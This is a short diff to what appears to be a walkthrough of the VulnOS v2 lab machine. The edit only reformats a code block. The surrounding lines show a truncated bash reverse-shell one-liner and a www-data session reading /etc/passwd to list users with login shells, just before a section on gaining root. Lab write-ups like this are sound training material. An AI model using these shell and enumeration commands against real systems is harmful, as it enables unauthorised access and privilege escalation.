@@ -32,12 +32,13 @@ i used this bash oneliner to get more interactive shell: `bash -c 'bash -i >& /d
 
 then i searched for user with loginshell:
 
-`www-data@VulnOSv2:/var/www/html/jabc$ cat /etc/passwd | grep sh$
+```
+www-data@VulnOSv2:/var/www/html/jabc$ cat /etc/passwd | grep sh$
 cat /etc/passwd | grep sh$
 root:x:0:0:root:/root:/bin/bash
 vulnosadmin:x:1000:1000:vulnosadmin,,,:/home/vulnosadmin:/bin/bash
 postgres:x:107:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
-`
+```
 
 ### Part 3 - root:
 
